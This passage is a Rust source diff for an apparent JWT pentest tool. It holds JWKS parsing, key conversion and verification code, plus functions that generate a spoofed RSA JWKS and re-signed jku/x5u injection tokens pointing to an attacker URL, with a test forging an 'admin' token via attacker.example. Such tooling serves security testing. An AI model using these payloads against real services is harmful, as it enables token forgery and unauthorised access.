@@ -1,0 +1,1136 @@
+use anyhow::{anyhow, Result};
+use base64::{engine::general_purpose::URL_SAFE_NO_PAD, Engine};
+use serde::{Deserialize, Serialize};
+use serde_json::Value;
+use std::collections::HashMap;
+
+/// A single JSON Web Key
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct Jwk {
+    pub kty: String,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub kid: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub alg: Option<String>,
+    #[serde(default, rename = "use", skip_serializing_if = "Option::is_none")]
+    pub key_use: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub key_ops: Option<Vec<String>>,
+    // RSA parameters
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub n: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub e: Option<String>,
+    // EC parameters
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub crv: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub x: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub y: Option<String>,
+    // Symmetric key
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub k: Option<String>,
+    // x5c certificate chain
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub x5c: Option<Vec<String>>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub x5t: Option<String>,
+    #[serde(default, rename = "x5t#S256", skip_serializing_if = "Option::is_none")]
+    pub x5t_s256: Option<String>,
+    // Catch-all for extra fields
+    #[serde(flatten)]
+    pub extra: HashMap<String, Value>,
+}
+
+/// A JSON Web Key Set
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct JwkSet {
+    pub keys: Vec<Jwk>,
+}
+
+/// Result of a spoofed JWKS generation
+#[derive(Debug)]
+pub struct SpoofedJwks {
+    /// The JWKS JSON (public keys)
+    pub jwks_json: String,
+    /// The private key in PEM format
+    pub private_key_pem: String,
+    /// A JWT token signed with the spoofed key
+    pub signed_token: Option<String>,
+}
+
+/// Maximum JWKS response body (bytes) that [`fetch_jwks`] will buffer.
+///
+/// A JWKS is normally a few kilobytes. Without a cap, `response.json()` buffers the
+/// entire body into memory, so a hostile or misconfigured endpoint could return a
+/// multi-gigabyte body and exhaust memory. 5 MiB is far more than any legitimate key
+/// set needs.
+const MAX_JWKS_BYTES: u64 = 5 * 1024 * 1024;
+
+/// Fetch a JWKS from a remote URL
+pub fn fetch_jwks(url: &str) -> Result<JwkSet> {
+    use std::io::Read;
+
+    let client = reqwest::blocking::Client::builder()
+        .timeout(std::time::Duration::from_secs(10))
+        .build()?;
+
+    let response = client
+        .get(url)
+        .header("Accept", "application/json")
+        .send()
+        .map_err(|e| anyhow!("Failed to fetch JWKS from {}: {}", url, e))?;
+
+    if !response.status().is_success() {
+        return Err(anyhow!(
+            "JWKS endpoint returned status {}: {}",
+            response.status(),
+            url
+        ));
+    }
+
+    // Bound the buffered body. reqwest's blocking `Response` implements `Read`;
+    // `take` caps how many bytes are read before parsing so an oversized response is
+    // rejected instead of exhausting memory.
+    let mut body = Vec::new();
+    response
+        .take(MAX_JWKS_BYTES + 1)
+        .read_to_end(&mut body)
+        .map_err(|e| anyhow!("Failed to read JWKS response from {}: {}", url, e))?;
+    if body.len() as u64 > MAX_JWKS_BYTES {
+        return Err(anyhow!(
+            "JWKS response from {} exceeds maximum allowed size of {} bytes",
+            url,
+            MAX_JWKS_BYTES
+        ));
+    }
+
+    let jwks: JwkSet = serde_json::from_slice(&body)
+        .map_err(|e| anyhow!("Failed to parse JWKS response: {}", e))?;
+
+    Ok(jwks)
+}
+
+/// Parse a JWKS from a JSON string
+pub fn parse_jwks(json_str: &str) -> Result<JwkSet> {
+    let jwks: JwkSet =
+        serde_json::from_str(json_str).map_err(|e| anyhow!("Failed to parse JWKS: {}", e))?;
+    Ok(jwks)
+}
+
+/// Convert a JWK RSA public key to PEM format
+pub fn jwk_rsa_to_pem(jwk: &Jwk) -> Result<String> {
+    use openssl::bn::BigNum;
+    use openssl::pkey::PKey;
+    use openssl::rsa::Rsa;
+
+    if jwk.kty != "RSA" {
+        return Err(anyhow!("JWK is not an RSA key (kty: {})", jwk.kty));
+    }
+
+    let n = jwk
+        .n
+        .as_ref()
+        .ok_or_else(|| anyhow!("Missing 'n' parameter in RSA JWK"))?;
+    let e = jwk
+        .e
+        .as_ref()
+        .ok_or_else(|| anyhow!("Missing 'e' parameter in RSA JWK"))?;
+
+    let n_bytes = URL_SAFE_NO_PAD
+        .decode(n)
+        .map_err(|e| anyhow!("Failed to decode 'n': {}", e))?;
+    let e_bytes = URL_SAFE_NO_PAD
+        .decode(e)
+        .map_err(|e| anyhow!("Failed to decode 'e': {}", e))?;
+
+    let rsa =
+        Rsa::from_public_components(BigNum::from_slice(&n_bytes)?, BigNum::from_slice(&e_bytes)?)?;
+    let pem = PKey::from_rsa(rsa)?.public_key_to_pem()?;
+    Ok(String::from_utf8(pem)?)
+}
+
+/// Convert a JWK EC public key (`crv`/`x`/`y`) to a SubjectPublicKeyInfo PEM.
+///
+/// Supports the P-256/P-384/P-521 curves used by ES256/ES384/ES512. Building the
+/// key through OpenSSL from the affine coordinates avoids hand-rolling EC point /
+/// named-curve DER encoding.
+pub fn jwk_ec_to_pem(jwk: &Jwk) -> Result<String> {
+    use openssl::bn::BigNum;
+    use openssl::ec::{EcGroup, EcKey};
+    use openssl::nid::Nid;
+    use openssl::pkey::PKey;
+
+    if jwk.kty != "EC" {
+        return Err(anyhow!("JWK is not an EC key (kty: {})", jwk.kty));
+    }
+
+    let crv = jwk
+        .crv
+        .as_deref()
+        .ok_or_else(|| anyhow!("Missing 'crv' parameter in EC JWK"))?;
+    let nid = match crv {
+        "P-256" => Nid::X9_62_PRIME256V1,
+        "P-384" => Nid::SECP384R1,
+        "P-521" => Nid::SECP521R1,
+        other => return Err(anyhow!("Unsupported EC curve: {}", other)),
+    };
+
+    let x = jwk
+        .x
+        .as_ref()
+        .ok_or_else(|| anyhow!("Missing 'x' parameter in EC JWK"))?;
+    let y = jwk
+        .y
+        .as_ref()
+        .ok_or_else(|| anyhow!("Missing 'y' parameter in EC JWK"))?;
+    let x_bytes = URL_SAFE_NO_PAD
+        .decode(x)
+        .map_err(|e| anyhow!("Failed to decode 'x': {}", e))?;
+    let y_bytes = URL_SAFE_NO_PAD
+        .decode(y)
+        .map_err(|e| anyhow!("Failed to decode 'y': {}", e))?;
+
+    let x_bn = BigNum::from_slice(&x_bytes)?;
+    let y_bn = BigNum::from_slice(&y_bytes)?;
+    let group = EcGroup::from_curve_name(nid)?;
+    let ec_key = EcKey::from_public_key_affine_coordinates(&group, &x_bn, &y_bn)?;
+    ec_key
+        .check_key()
+        .map_err(|e| anyhow!("EC public key is not valid for curve {}: {}", crv, e))?;
+    let pkey = PKey::from_ec_key(ec_key)?;
+    let pem = pkey.public_key_to_pem()?;
+    String::from_utf8(pem).map_err(|e| anyhow!("EC PEM is not valid UTF-8: {}", e))
+}
+
+/// Generate a spoofed JWKS with a new RSA key pair
+pub fn generate_spoofed_jwks(
+    algorithm: &str,
+    kid: Option<&str>,
+    token: Option<&str>,
+) -> Result<SpoofedJwks> {
+    use rsa::pkcs8::EncodePrivateKey;
+    use rsa::RsaPrivateKey;
+
+    let alg_upper = algorithm.to_uppercase();
+    if !matches!(
+        alg_upper.as_str(),
+        "RS256" | "RS384" | "RS512" | "PS256" | "PS384" | "PS512"
+    ) {
+        return Err(anyhow!(
+            "JWKS spoofing currently supports RSA algorithms (RS256/RS384/RS512/PS256/PS384/PS512), got: {}",
+            algorithm
+        ));
+    }
+
+    // Generate RSA key pair
+    let mut rng = rsa::rand_core::OsRng;
+    let bits = 2048;
+    let private_key = RsaPrivateKey::new(&mut rng, bits)
+        .map_err(|e| anyhow!("Failed to generate RSA key: {}", e))?;
+    let public_key = private_key.to_public_key();
+
+    // Extract modulus and exponent for JWK
+    use rsa::traits::PublicKeyParts;
+    let n_bytes = public_key.n().to_bytes_be();
+    let e_bytes = public_key.e().to_bytes_be();
+
+    let n_b64 = URL_SAFE_NO_PAD.encode(&n_bytes);
+    let e_b64 = URL_SAFE_NO_PAD.encode(&e_bytes);
+
+    let kid_value = kid
+        .map(|s| s.to_string())
+        .unwrap_or_else(|| format!("spoofed-key-{}", chrono::Utc::now().timestamp()));
+
+    let jwk = Jwk {
+        kty: "RSA".to_string(),
+        kid: Some(kid_value.clone()),
+        alg: Some(algorithm.to_uppercase()),
+        key_use: Some("sig".to_string()),
+        key_ops: None,
+        n: Some(n_b64),
+        e: Some(e_b64),
+        crv: None,
+        x: None,
+        y: None,
+        k: None,
+        x5c: None,
+        x5t: None,
+        x5t_s256: None,
+        extra: HashMap::new(),
+    };
+
+    let jwks = JwkSet { keys: vec![jwk] };
+
+    let jwks_json = serde_json::to_string_pretty(&jwks)?;
+
+    // Export private key as PEM
+    let private_key_pem = private_key
+        .to_pkcs8_pem(rsa::pkcs8::LineEnding::LF)
+        .map_err(|e| anyhow!("Failed to export private key: {}", e))?
+        .to_string();
+
+    // If a token is provided, re-sign it with the spoofed key
+    let signed_token = if let Some(token) = token {
+        sign_token_with_key(token, &private_key_pem, algorithm, Some(&kid_value)).ok()
+    } else {
+        None
+    };
+
+    Ok(SpoofedJwks {
+        jwks_json,
+        private_key_pem,
+        signed_token,
+    })
+}
+
+/// Re-sign a JWT token with a given private key, optionally adding kid and jku headers
+fn sign_token_with_key(
+    token: &str,
+    private_key_pem: &str,
+    algorithm: &str,
+    kid: Option<&str>,
+) -> Result<String> {
+    // Decode the original token to get claims
+    let decoded = crate::jwt::decode(token)?;
+
+    // Build header params
+    let mut header_params = HashMap::new();
+    if let Some(kid) = kid {
+        header_params.insert("kid", kid);
+    }
+
+    let options = crate::jwt::EncodeOptions {
+        algorithm,
+        key_data: crate::jwt::KeyData::PrivateKeyPem(private_key_pem),
+        header_params: if header_params.is_empty() {
+            None
+        } else {
+            Some(header_params)
+        },
+        compress_payload: false,
+    };
+
+    crate::jwt::encode_with_options(&decoded.claims, &options)
+}
+
+/// Verify a JWT token against all keys in a JWKS
+pub fn verify_with_jwks(token: &str, jwks: &JwkSet) -> Result<Vec<KeyVerifyResult>> {
+    // A compact JWS never contains surrounding whitespace, but a token pasted or
+    // piped in commonly carries a trailing newline. Un-trimmed, that byte corrupts
+    // the base64url signature segment and every key is wrongly reported INVALID.
+    let token = token.trim();
+    let mut results = Vec::new();
+
+    for (i, jwk) in jwks.keys.iter().enumerate() {
+        let kid = jwk.kid.as_deref().unwrap_or("(none)");
+
+        match jwk.kty.as_str() {
+            "RSA" => match jwk_rsa_to_pem(jwk) {
+                Ok(pem) => {
+                    let options = crate::jwt::VerifyOptions {
+                        key_data: crate::jwt::VerifyKeyData::PublicKeyPem(&pem),
+                        validate_exp: false,
+                        validate_nbf: false,
+                        leeway: 0,
+                    };
+                    match crate::jwt::verify_with_options(token, &options) {
+                        Ok(valid) => {
+                            results.push(KeyVerifyResult {
+                                key_index: i,
+                                kid: kid.to_string(),
+                                kty: jwk.kty.clone(),
+                                alg: jwk.alg.clone(),
+                                valid,
+                                error: None,
+                            });
+                        }
+                        Err(e) => {
+                            results.push(KeyVerifyResult {
+                                key_index: i,
+                                kid: kid.to_string(),
+                                kty: jwk.kty.clone(),
+                                alg: jwk.alg.clone(),
+                                valid: false,
+                                error: Some(e.to_string()),
+                            });
+                        }
+                    }
+                }
+                Err(e) => {
+                    results.push(KeyVerifyResult {
+                        key_index: i,
+                        kid: kid.to_string(),
+                        kty: jwk.kty.clone(),
+                        alg: jwk.alg.clone(),
+                        valid: false,
+                        error: Some(format!("Key conversion failed: {}", e)),
+                    });
+                }
+            },
+            "EC" => match jwk_ec_to_pem(jwk) {
+                Ok(pem) => {
+                    let options = crate::jwt::VerifyOptions {
+                        key_data: crate::jwt::VerifyKeyData::PublicKeyPem(&pem),
+                        validate_exp: false,
+                        validate_nbf: false,
+                        leeway: 0,
+                    };
+                    match crate::jwt::verify_with_options(token, &options) {
+                        Ok(valid) => {
+                            results.push(KeyVerifyResult {
+                                key_index: i,
+                                kid: kid.to_string(),
+                                kty: jwk.kty.clone(),
+                                alg: jwk.alg.clone(),
+                                valid,
+                                error: None,
+                            });
+                        }
+                        Err(e) => {
+                            results.push(KeyVerifyResult {
+                                key_index: i,
+                                kid: kid.to_string(),
+                                kty: jwk.kty.clone(),
+                                alg: jwk.alg.clone(),
+                                valid: false,
+                                error: Some(e.to_string()),
+                            });
+                        }
+                    }
+                }
+                Err(e) => {
+                    results.push(KeyVerifyResult {
+                        key_index: i,
+                        kid: kid.to_string(),
+                        kty: jwk.kty.clone(),
+                        alg: jwk.alg.clone(),
+                        valid: false,
+                        error: Some(format!("Key conversion failed: {}", e)),
+                    });
+                }
+            },
+            "oct" => {
+                if let Some(k) = &jwk.k {
+                    match URL_SAFE_NO_PAD.decode(k) {
+                        Ok(secret_bytes) => {
+                            // Use the raw key bytes verbatim. A JWKS `oct` key is
+                            // arbitrary binary; `from_utf8_lossy` would replace any
+                            // non-UTF-8 byte with U+FFFD and make verification of a
+                            // correctly-signed token fail.
+                            let options = crate::jwt::VerifyOptions {
+                                key_data: crate::jwt::VerifyKeyData::SecretBytes(&secret_bytes),
+                                validate_exp: false,
+                                validate_nbf: false,
+                                leeway: 0,
+                            };
+                            match crate::jwt::verify_with_options(token, &options) {
+                                Ok(valid) => {
+                                    results.push(KeyVerifyResult {
+                                        key_index: i,
+                                        kid: kid.to_string(),
+                                        kty: jwk.kty.clone(),
+                                        alg: jwk.alg.clone(),
+                                        valid,
+                                        error: None,
+                                    });
+                                }
+                                Err(e) => {
+                                    results.push(KeyVerifyResult {
+                                        key_index: i,
+                                        kid: kid.to_string(),
+                                        kty: jwk.kty.clone(),
+                                        alg: jwk.alg.clone(),
+                                        valid: false,
+                                        error: Some(e.to_string()),
+                                    });
+                                }
+                            }
+                        }
+                        Err(e) => {
+                            results.push(KeyVerifyResult {
+                                key_index: i,
+                                kid: kid.to_string(),
+                                kty: jwk.kty.clone(),
+                                alg: jwk.alg.clone(),
+                                valid: false,
+                                error: Some(format!("Failed to decode symmetric key: {}", e)),
+                            });
+                        }
+                    }
+                } else {
+                    results.push(KeyVerifyResult {
+                        key_index: i,
+                        kid: kid.to_string(),
+                        kty: jwk.kty.clone(),
+                        alg: jwk.alg.clone(),
+                        valid: false,
+                        error: Some("Missing 'k' parameter".to_string()),
+                    });
+                }
+            }
+            other => {
+                results.push(KeyVerifyResult {
+                    key_index: i,
+                    kid: kid.to_string(),
+                    kty: other.to_string(),
+                    alg: jwk.alg.clone(),
+                    valid: false,
+                    error: Some(format!("Unsupported key type: {}", other)),
+                });
+            }
+        }
+    }
+
+    Ok(results)
+}
+
+/// Result of verifying a token against a specific key
+#[derive(Debug)]
+pub struct KeyVerifyResult {
+    pub key_index: usize,
+    pub kid: String,
+    pub kty: String,
+    pub alg: Option<String>,
+    pub valid: bool,
+    pub error: Option<String>,
+}
+
+/// Map an RSA `alg` name to its [`jsonwebtoken::Algorithm`]. Only the RSA family
+/// is accepted, matching the algorithms [`generate_spoofed_jwks`] can produce.
+fn jwt_algorithm_from_str(algorithm: &str) -> Result<jsonwebtoken::Algorithm> {
+    use jsonwebtoken::Algorithm;
+    match algorithm.to_uppercase().as_str() {
+        "RS256" => Ok(Algorithm::RS256),
+        "RS384" => Ok(Algorithm::RS384),
+        "RS512" => Ok(Algorithm::RS512),
+        "PS256" => Ok(Algorithm::PS256),
+        "PS384" => Ok(Algorithm::PS384),
+        "PS512" => Ok(Algorithm::PS512),
+        other => Err(anyhow!(
+            "Unsupported algorithm for JWKS injection: {}",
+            other
+        )),
+    }
+}
+
+/// Generate JKU/X5U injection payloads with a real spoofed JWKS
+pub fn generate_jwks_injection_payloads(
+    token: &str,
+    attacker_url: &str,
+    algorithm: &str,
+) -> Result<JwksInjectionResult> {
+    let spoofed = generate_spoofed_jwks(algorithm, None, Some(token))?;
+
+    let signed_token = spoofed
+        .signed_token
+        .ok_or_else(|| anyhow!("Failed to sign token with spoofed key"))?;
+
+    // Decode the signed token to get header/claims parts
+    let parts: Vec<&str> = signed_token.split('.').collect();
+    if parts.len() != 3 {
+        return Err(anyhow!("Invalid signed token format"));
+    }
+
+    // Decode the signed token for the header (its kid → picks the spoofed key) and claims.
+    let decoded = crate::jwt::decode(&signed_token)?;
+    let claims_part = parts[1];
+
+    // Injecting jku/x5u changes the header, and therefore the signing input, so the
+    // spoofed token's original signature no longer covers it. Re-sign each variant
+    // with the spoofed private key over the new `header.claims`; without this the
+    // payload never verifies against the attacker-hosted JWKS, defeating the attack.
+    let jwt_alg = jwt_algorithm_from_str(algorithm)?;
+    let encoding_key = jsonwebtoken::EncodingKey::from_rsa_pem(spoofed.private_key_pem.as_bytes())
+        .map_err(|e| anyhow!("Failed to load spoofed private key for re-signing: {}", e))?;
+
+    let sign_injection = |header_key: &str, url: String| -> Result<InjectionPayload> {
+        let mut header = serde_json::Map::new();
+        for (k, v) in &decoded.header {
+            header.insert(k.clone(), v.clone());
+        }
+        header.insert(header_key.to_string(), Value::String(url.clone()));
+        let header_json = serde_json::to_string(&header)?;
+        let header_b64 = URL_SAFE_NO_PAD.encode(header_json.as_bytes());
+        let signing_input = format!("{header_b64}.{claims_part}");
+        let signature_b64 =
+            jsonwebtoken::crypto::sign(signing_input.as_bytes(), &encoding_key, jwt_alg).map_err(
+                |e| anyhow!("Failed to re-sign {} injection payload: {}", header_key, e),
+            )?;
+        Ok(InjectionPayload {
+            header_type: header_key.to_string(),
+            token: format!("{signing_input}.{signature_b64}"),
+            description: format!(
+                "{} injection pointing to {}",
+                header_key.to_uppercase(),
+                url
+            ),
+        })
+    };
+
+    let base = attacker_url.trim_end_matches('/');
+    let payloads = vec![
+        sign_injection("jku", format!("{base}/jwks.json"))?,
+        sign_injection("x5u", format!("{base}/cert.pem"))?,
+    ];
+
+    Ok(JwksInjectionResult {
+        jwks_json: spoofed.jwks_json,
+        private_key_pem: spoofed.private_key_pem,
+        payloads,
+    })
+}
+
+/// Result of JWKS injection payload generation
+#[derive(Debug)]
+pub struct JwksInjectionResult {
+    pub jwks_json: String,
+    pub private_key_pem: String,
+    pub payloads: Vec<InjectionPayload>,
+}
+
+/// A single injection payload
+#[derive(Debug)]
+pub struct InjectionPayload {
+    pub header_type: String,
+    pub token: String,
+    pub description: String,
+}
+
+/// Test key rotation by verifying a token against multiple key files
+pub fn test_key_rotation(
+    token: &str,
+    key_paths: &[std::path::PathBuf],
+) -> Result<Vec<KeyRotationResult>> {
+    // A trailing newline on the token corrupts its signature segment and makes every
+    // key report INVALID; trim it once so the whole batch verifies the real token.
+    let token = token.trim();
+    let mut results = Vec::new();
+
+    for path in key_paths {
+        let filename = path
+            .file_name()
+            .map(|f| f.to_string_lossy().to_string())
+            .unwrap_or_else(|| path.display().to_string());
+
+        // Read the key as raw bytes. A single unreadable or non-UTF-8 key file must
+        // not abort the entire batch: the previous `read_to_string(path)?` propagated
+        // the first such error, so a keys directory holding one binary file (a DER
+        // key, a raw HMAC secret) left every *other* key — including ones that would
+        // verify the token — untested. Record a per-key error and keep going instead.
+        let key_bytes = match std::fs::read(path) {
+            Ok(b) => b,
+            Err(e) => {
+                results.push(KeyRotationResult {
+                    key_file: filename,
+                    valid: false,
+                    error: Some(format!("Failed to read key file: {}", e)),
+                });
+                continue;
+            }
+        };
+
+        // A PEM public key and a text HMAC secret both need a `&str`. A non-UTF-8 key
+        // can still be a legitimate *binary* HMAC secret (JWK `oct` keys are arbitrary
+        // bytes), so fall back to verifying it as raw secret bytes rather than
+        // discarding it.
+        let result = match std::str::from_utf8(&key_bytes) {
+            Ok(key_content) => {
+                // Try as a public-key PEM first, then as a (text) HMAC secret.
+                let pem_options = crate::jwt::VerifyOptions {
+                    key_data: crate::jwt::VerifyKeyData::PublicKeyPem(key_content),
+                    validate_exp: false,
+                    validate_nbf: false,
+                    leeway: 0,
+                };
+                match crate::jwt::verify_with_options(token, &pem_options) {
+                    Ok(valid) => (valid, None),
+                    Err(_) => {
+                        let secret_options = crate::jwt::VerifyOptions {
+                            key_data: crate::jwt::VerifyKeyData::Secret(key_content.trim()),
+                            validate_exp: false,
+                            validate_nbf: false,
+                            leeway: 0,
+                        };
+                        match crate::jwt::verify_with_options(token, &secret_options) {
+                            Ok(valid) => (valid, None),
+                            Err(e) => (false, Some(e.to_string())),
+                        }
+                    }
+                }
+            }
+            Err(_) => {
+                // Binary key material: verify as raw HMAC secret bytes.
+                let secret_options = crate::jwt::VerifyOptions {
+                    key_data: crate::jwt::VerifyKeyData::SecretBytes(&key_bytes),
+                    validate_exp: false,
+                    validate_nbf: false,
+                    leeway: 0,
+                };
+                match crate::jwt::verify_with_options(token, &secret_options) {
+                    Ok(valid) => (valid, None),
+                    Err(e) => (false, Some(format!("Non-UTF-8 key file: {}", e))),
+                }
+            }
+        };
+
+        results.push(KeyRotationResult {
+            key_file: filename,
+            valid: result.0,
+            error: result.1,
+        });
+    }
+
+    Ok(results)
+}
+
+/// Result of testing a key in rotation
+#[derive(Debug)]
+pub struct KeyRotationResult {
+    pub key_file: String,
+    pub valid: bool,
+    pub error: Option<String>,
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_parse_jwks() {
+        let jwks_json = r#"{
+            "keys": [
+                {
+                    "kty": "RSA",
+                    "kid": "test-key-1",
+                    "use": "sig",
+                    "alg": "RS256",
+                    "n": "0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArwl93lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0zgdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6WeZu0fM4lFd2NcRwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJzKnqDKgw",
+                    "e": "AQAB"
+                }
+            ]
+        }"#;
+
+        let jwks = parse_jwks(jwks_json).unwrap();
+        assert_eq!(jwks.keys.len(), 1);
+        assert_eq!(jwks.keys[0].kty, "RSA");
+        assert_eq!(jwks.keys[0].kid.as_deref(), Some("test-key-1"));
+        assert_eq!(jwks.keys[0].alg.as_deref(), Some("RS256"));
+    }
+
+    #[test]
+    fn test_jwk_rsa_to_pem() {
+        let jwk = Jwk {
+            kty: "RSA".to_string(),
+            kid: Some("test".to_string()),
+            alg: Some("RS256".to_string()),
+            key_use: Some("sig".to_string()),
+            key_ops: None,
+            n: Some("0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArwl93lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0zgdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6WeZu0fM4lFd2NcRwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJzKnqDKgw".to_string()),
+            e: Some("AQAB".to_string()),
+            crv: None,
+            x: None,
+            y: None,
+            k: None,
+            x5c: None,
+            x5t: None,
+            x5t_s256: None,
+            extra: HashMap::new(),
+        };
+
+        let pem = jwk_rsa_to_pem(&jwk).unwrap();
+        assert!(openssl::pkey::PKey::public_key_from_pem(pem.as_bytes())
+            .unwrap()
+            .rsa()
+            .is_ok());
+    }
+
+    #[test]
+    fn test_parse_jwks_empty() {
+        let jwks_json = r#"{"keys": []}"#;
+        let jwks = parse_jwks(jwks_json).unwrap();
+        assert_eq!(jwks.keys.len(), 0);
+    }
+
+    #[test]
+    fn test_parse_jwks_invalid_json() {
+        let result = parse_jwks("not json");
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn test_generate_spoofed_jwks() {
+        let result = generate_spoofed_jwks("RS256", Some("test-kid"), None);
+        assert!(result.is_ok());
+        let spoofed = result.unwrap();
+
+        // Verify JWKS structure
+        let jwks: JwkSet = serde_json::from_str(&spoofed.jwks_json).unwrap();
+        assert_eq!(jwks.keys.len(), 1);
+        assert_eq!(jwks.keys[0].kty, "RSA");
+        assert_eq!(jwks.keys[0].kid.as_deref(), Some("test-kid"));
+        assert!(jwks.keys[0].n.is_some());
+        assert!(jwks.keys[0].e.is_some());
+
+        // Verify private key
+        assert!(spoofed
+            .private_key_pem
+            .contains("-----BEGIN PRIVATE KEY-----"));
+    }
+
+    #[test]
+    fn test_generate_spoofed_jwks_with_token() {
+        // Create a test token
+        let claims = serde_json::json!({"sub": "test", "name": "Test User"});
+        let token =
+            crate::jwt::encode(&claims, "secret", "HS256").expect("Failed to create test token");
+
+        let result = generate_spoofed_jwks("RS256", Some("test-kid"), Some(&token));
+        assert!(result.is_ok());
+        let spoofed = result.unwrap();
+        assert!(spoofed.signed_token.is_some());
+    }
+
+    #[test]
+    fn test_generate_spoofed_jwks_unsupported_alg() {
+        let result = generate_spoofed_jwks("ES256", None, None);
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn test_verify_with_jwks_ec_p256_key() {
+        // Regression: EC keys (kty:"EC") were reported "Unsupported key type", so an
+        // ES256 token — one of the most common JWT signatures — could never be
+        // verified against its JWKS. Build a real P-256 key, sign a token with it,
+        // publish the public key as an EC JWK, and confirm verification succeeds.
+        use openssl::bn::BigNumContext;
+        use openssl::ec::{EcGroup, EcKey};
+        use openssl::nid::Nid;
+        use openssl::pkey::PKey;
+
+        let group = EcGroup::from_curve_name(Nid::X9_62_PRIME256V1).unwrap();
+        let ec = EcKey::generate(&group).unwrap();
+        let pkey = PKey::from_ec_key(ec.clone()).unwrap();
+        let priv_pem = String::from_utf8(pkey.private_key_to_pem_pkcs8().unwrap()).unwrap();
+
+        let claims = serde_json::json!({ "sub": "ec-user" });
+        let options = crate::jwt::EncodeOptions {
+            algorithm: "ES256",
+            key_data: crate::jwt::KeyData::PrivateKeyPem(&priv_pem),
+            header_params: None,
+            compress_payload: false,
+        };
+        let token = crate::jwt::encode_with_options(&claims, &options).expect("sign ES256 token");
+
+        // Extract affine coordinates for the JWK.
+        let mut ctx = BigNumContext::new().unwrap();
+        let mut x = openssl::bn::BigNum::new().unwrap();
+        let mut y = openssl::bn::BigNum::new().unwrap();
+        ec.public_key()
+            .affine_coordinates_gfp(&group, &mut x, &mut y, &mut ctx)
+            .unwrap();
+        let jwk = Jwk {
+            kty: "EC".to_string(),
+            kid: Some("ec-1".to_string()),
+            alg: Some("ES256".to_string()),
+            key_use: Some("sig".to_string()),
+            key_ops: None,
+            n: None,
+            e: None,
+            crv: Some("P-256".to_string()),
+            x: Some(URL_SAFE_NO_PAD.encode(x.to_vec())),
+            y: Some(URL_SAFE_NO_PAD.encode(y.to_vec())),
+            k: None,
+            x5c: None,
+            x5t: None,
+            x5t_s256: None,
+            extra: HashMap::new(),
+        };
+
+        // jwk_ec_to_pem must produce a usable SPKI PEM.
+        assert!(jwk_ec_to_pem(&jwk).unwrap().contains("BEGIN PUBLIC KEY"));
+
+        let jwks = JwkSet {
+            keys: vec![jwk.clone()],
+        };
+        let results = verify_with_jwks(&token, &jwks).expect("verify");
+        assert!(
+            results[0].valid,
+            "ES256 token must verify against its EC JWK, got {:?}",
+            results[0]
+        );
+
+        // A different EC key must NOT verify (valid:false, not an error).
+        let other = EcKey::generate(&group).unwrap();
+        let mut x2 = openssl::bn::BigNum::new().unwrap();
+        let mut y2 = openssl::bn::BigNum::new().unwrap();
+        other
+            .public_key()
+            .affine_coordinates_gfp(&group, &mut x2, &mut y2, &mut ctx)
+            .unwrap();
+        let mut wrong = jwk;
+        wrong.x = Some(URL_SAFE_NO_PAD.encode(x2.to_vec()));
+        wrong.y = Some(URL_SAFE_NO_PAD.encode(y2.to_vec()));
+        let wrong_jwks = JwkSet { keys: vec![wrong] };
+        let wrong_results = verify_with_jwks(&token, &wrong_jwks).expect("verify");
+        assert!(!wrong_results[0].valid, "wrong EC key must not verify");
+        assert!(wrong_results[0].error.is_none());
+    }
+
+    #[test]
+    fn test_jwks_injection_payloads_verify_against_spoofed_jwks() {
+        // The whole point of a jku/x5u injection payload is that once the server
+        // fetches the attacker-hosted JWKS, the token verifies against it. That
+        // requires the signature to cover the *injected* header. Previously the
+        // header was rebuilt (jku/x5u added, keys re-serialized) but the original
+        // signature was kept, so the payloads never verified.
+        let claims = serde_json::json!({ "sub": "victim", "admin": true });
+        let token = crate::jwt::encode(&claims, "irrelevant", "HS256").expect("build source token");
+
+        let result = generate_jwks_injection_payloads(&token, "https://attacker.example", "RS256")
+            .expect("generate injection payloads");
+
+        let jwks: JwkSet = serde_json::from_str(&result.jwks_json).expect("parse spoofed jwks");
+
+        assert_eq!(result.payloads.len(), 2, "expected jku and x5u payloads");
+        for p in &result.payloads {
+            let verdicts = verify_with_jwks(&p.token, &jwks).expect("verify against jwks");
+            assert!(
+                verdicts.iter().any(|v| v.valid),
+                "{} injection payload must verify against the spoofed JWKS, got {:?}",
+                p.header_type,
+                verdicts
+            );
+            // The injected header must actually carry the jku/x5u pointer.
+            let header = crate::jwt::decode(&p.token).expect("decode payload").header;
+            assert!(
+                header.contains_key(&p.header_type),
+                "payload header missing injected {} field",
+                p.header_type
+            );
+        }
+    }
+
+    #[test]
+    fn test_jwk_rsa_to_pem_non_rsa() {
